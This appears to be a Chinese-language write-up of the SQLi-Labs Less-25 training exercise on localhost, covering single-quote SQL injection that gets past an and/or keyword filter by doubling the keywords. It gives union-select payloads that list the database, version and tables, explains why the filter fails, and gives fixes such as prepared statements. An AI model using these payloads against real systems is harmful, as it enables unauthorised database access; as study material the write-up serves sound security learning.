# SQLi-Labs | Less-25 GET 单引号 过滤or and 联合注入
## 一、漏洞简介
GET单引号字符注入，过滤了and、or，大小写替换、双写绕过，页面有回显，union联合查询脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-25/?id=1
注入类型：GET、字符型、单引号闭合、关键字过滤、联合注入
## 三、复现步骤
1. ?id=1' 报错，确认单引号闭合。
2. 测试and、or被过滤，采用双写绕过：anandd、oor。
3. order by判断列数3列，union联合查询。
## 四、Payload
判断列数：
`?id=1' anandd order by 3 --+`
查库：
`?id=-1' union select 1,version(),database() --+`
查表：
`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`
## 五、漏洞原理
后端SQL：
`SELECT * FROM users WHERE id='$id' LIMIT 0,1`
代码使用简单替换，把and、or替换为空，双写后，替换掉中间的and，剩下的and保留，成功绕过过滤。
## 六、修复方案
1. 使用预编译，不依赖关键字过滤。
2. 正则匹配整词，不要简单字符串替换。
3. 输入白名单限制。
## 七、总结
Less25学习and/or关键字双写绕过，是简单黑名单过滤的典型缺陷。